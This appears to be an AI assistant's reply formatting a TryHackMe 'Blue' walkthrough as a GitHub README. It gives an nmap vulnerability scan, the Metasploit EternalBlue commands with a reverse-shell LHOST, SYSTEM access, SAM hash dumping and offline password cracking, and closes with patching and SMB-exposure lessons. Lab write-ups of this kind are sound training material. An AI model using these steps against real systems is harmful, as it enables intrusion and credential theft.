To make your GitHub profile stand out, it is best to format these walkthroughs using **collapsible sections**. This keeps your README clean and readable while allowing recruiters to click and expand the specific technical details of each lab.

Here is the **Blue** walkthrough formatted specifically for a high-quality GitHub README:

````markdown
# 🛡️ Technical Lab Walkthroughs

<details>
<summary><b>🔵 Blue — TryHackMe Walkthrough (Windows Exploitation)</b></summary>

### **Overview**
**Room:** [Blue](https://tryhackme.com/room/blue) | **Difficulty:** 🟢 Easy  
**Category:** Windows Exploitation / Metasploit  
**Tags:** `EternalBlue`, `MS17-010`, `Privilege Escalation`, `SMB`

Blue is a foundational lab focusing on the **MS17-010 (EternalBlue)** vulnerability, famously used in the WannaCry ransomware attack. The objective is to exploit a vulnerable SMB service, escalate to `SYSTEM` authority, and capture three flags.

---

### **🔧 Tools Used**
* **Nmap:** Network scanning and vulnerability detection.
* **Metasploit Framework:** Exploitation and post-exploitation.
* **Hashdump:** Credential dumping from the SAM database.
* **John the Ripper:** Password cracking.

---

### **📡 Step 1: Reconnaissance**
I started with an Nmap scan to identify open ports and check for known vulnerabilities using the `--script vuln` flag.

```bash
nmap -sV -sC --script vuln -oN blue_scan.txt <TARGET_IP>
````

**Key Findings:**

  * **Port 445 (SMB):** Flagged as vulnerable to **ms17-010 (EternalBlue)**.
  * **OS:** Windows 7 Professional.

-----

### **💥 Step 2: Exploitation**

Using Metasploit, I selected the EternalBlue exploit module and configured the payload for a reverse shell.

```msf
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
run
```

Once the initial shell was established, I upgraded the session to **Meterpreter** for advanced post-exploitation capabilities.

-----

### **🔼 Step 3: Privilege Escalation**

Because EternalBlue exploits a kernel-level vulnerability, the shell automatically landed as **NT AUTHORITY\\SYSTEM**. I verified this with:

```msf
getuid
# Output: Server username: NT AUTHORITY\SYSTEM
```

-----

### **🔑 Step 4: Credential Dumping**

With SYSTEM access, I dumped the local password hashes using `hashdump`. These hashes can be cracked offline using **John the Ripper** and the `rockyou.txt` wordlist to recover plaintext passwords.

-----

### **🚩 Step 5: Flag Capture**

I used the Meterpreter `search` command to locate the three flags hidden across the system:

1.  **Flag 1:** Root directory (`C:\flag1.txt`)
2.  **Flag 2:** Config directory (`C:\Windows\System32\config\flag2.txt`)
3.  **Flag 3:** User Documents (`C:\Users\Jon\Documents\flag3.txt`)

-----

### **📝 Key Takeaways**

  * **Patch Management:** This lab demonstrates why critical security updates (like MS17-010) must be applied immediately.
  * **Service Exposure:** Port 445 should never be exposed to the public internet without a VPN or strict firewall rules.
  * **Post-Exploitation:** Gaining SYSTEM access allows for total control, including credential harvesting for lateral movement.

\</details\>

````

### 💡 Why use this format?

  * **The `<details>` tag:** It prevents your README from becoming a "wall of text." Users only see the title until they want to read the details.
  * **Syntax Highlighting:** Using ` ```bash ` and ` ```msf ` makes your code snippets look professional.
  * **Recruiter Friendly:** It shows you can document technical processes clearly—a vital skill for a Cybersecurity professional.
````
